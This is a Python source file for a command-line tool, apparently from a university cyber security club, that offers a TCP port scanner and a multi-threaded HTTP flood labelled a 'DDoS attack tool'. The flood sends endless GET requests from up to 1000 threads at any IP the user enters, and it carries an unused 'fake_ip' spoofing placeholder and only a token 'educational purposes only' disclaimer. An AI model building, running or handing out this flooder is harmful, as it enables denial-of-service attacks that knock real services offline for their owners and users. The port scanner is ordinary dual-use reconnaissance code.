import socket
import threading
import subprocess
import sys
import os
import time
import logging
from datetime import datetime

# Initialize attack threads to 0
attack_num = 0

# Create and configure logger
logging.basicConfig(filename="loggerfile.log", format='%(asctime)s %(message)s', filemode='w')
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)

# Test messages
logger.debug("Harmless debug Message")
logger.info("main.py launched".upper())

print("TO RUN ME YOU NEED TO INSTALL SOME PACKAGES. RUN install.sh IF YOU HAVEN'T INSTALLED THEM.".upper())

def main():
    logger.info("main() function runs".upper())
    os.system("clear")
    print("*" * 61)
    print('''THE TOOL IS DEVELOPED BY KISII UNIVERSITY CYBER SECURITY CLUB
                MORE UPDATES COMING
USE IT ON UNIX SHELLS ONLY AND FOR EDUCATIONAL PURPOSES ONLY!
                #CODDED BY CYB37 V3N0M#''')
    print("*" * 61)
    print('''CHOOSE BETWEEN THE FOLLOWING OPTIONS:
        1. CHOOSE 1 FOR PORT SCAN
        2. CHOOSE 2 FOR DDOS ATTACK TOOL''')
    
    option = input("Enter your option: ")
    
    if option == "1":
        logger.info("main() function: option one taken".upper())
        portscan()
    elif option == "2":
        logger.info("main() function: option two taken".upper())
        run()
    else:
        logger.warning("Warning: invalid option picked")
        print("Invalid option. Please try again.")
        time.sleep(1)
        os.system("clear")
        main()

# Port scanning
def portscan():
    logger.info("Port scan initialized".upper())
    subprocess.call('clear', shell=True)
    
    target = input("Enter target IP address (e.g. 127.0.0.1): ")
    logger.info(f"Target IP set to {target}".upper())
    
    try:
        url = socket.gethostbyaddr(target)
        print(f"Target Host: {url[0]}")  # Print hostname if available
    except socket.herror:
        print("Host name not available")
    
    remote_server = input("Enter the remote host URL to scan: ")
    logger.info(f"URL set to {remote_server}".upper())
    
    try:
        maxscan = int(input("Enter the furthest port to scan (1-65535): "))
        if not (1 <= maxscan <= 65535):
            print("Please enter a valid port range between 1 and 65535.")
            return
    except ValueError:
        print("Please enter a valid number.")
        return
    
    remote_server_ip = socket.gethostbyname(remote_server)
    print("-" * 60)
    print(f"Please wait, scanning remote host {remote_server_ip}...")
    print("This may take a while...")
    print("-" * 60)

    t1 = datetime.now()

    try:
        for port in range(1, maxscan + 1):  # Include maxscan in the range
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)  # Set a timeout for the socket connection
                result = sock.connect_ex((remote_server_ip, port))
                if result == 0:
                    print(f"Port {port}: Open")

    except KeyboardInterrupt:
        logger.warning("Keyboard Interrupt, exiting session")
        print("You pressed Ctrl+C")
        sys.exit()

    except socket.gaierror:
        logger.critical("Internet down, hostname resolution failed")
        print('Hostname could not be resolved. Exiting.')
        sys.exit()

    except socket.error:
        logger.critical("Server connection error, program exiting")
        print("Couldn't connect to server")
        sys.exit()

    t2 = datetime.now()
    total = t2 - t1
    print('Scanning Completed in: ', total)

def attack(target, port, fake_ip):
    logger.info(f"Attack function started on target {target}, port {port}".upper())
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((target, port))
                s.sendto(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode('ascii'), (target, port))
                global attack_num
                attack_num += 1
                print(f"Attack {attack_num} sent.")
        except Exception as e:
            logger.error(f"Error during attack: {e}")
            break

def run():
    logger.info("Run() function initialized".upper())
    subprocess.call('clear', shell=True)
    
    target = input("Enter IP address to attack: ")
    port = 80
    fake_ip = "182.21.20.32"
    logger.info(f"IP set to {target}, with port {port}".upper())
    
    threads = input("Enter number of threads (1-1000): ")
    if not threads.isdigit() or not (1 <= int(threads) <= 1000):
        logger.warning("Invalid thread count")
        print("Please enter a valid number of threads (1-1000).")
        return
    
    for i in range(int(threads)):
        thread = threading.Thread(target=attack, args=(target, port, fake_ip))
        thread.start()

if __name__ == "__main__":
    main()
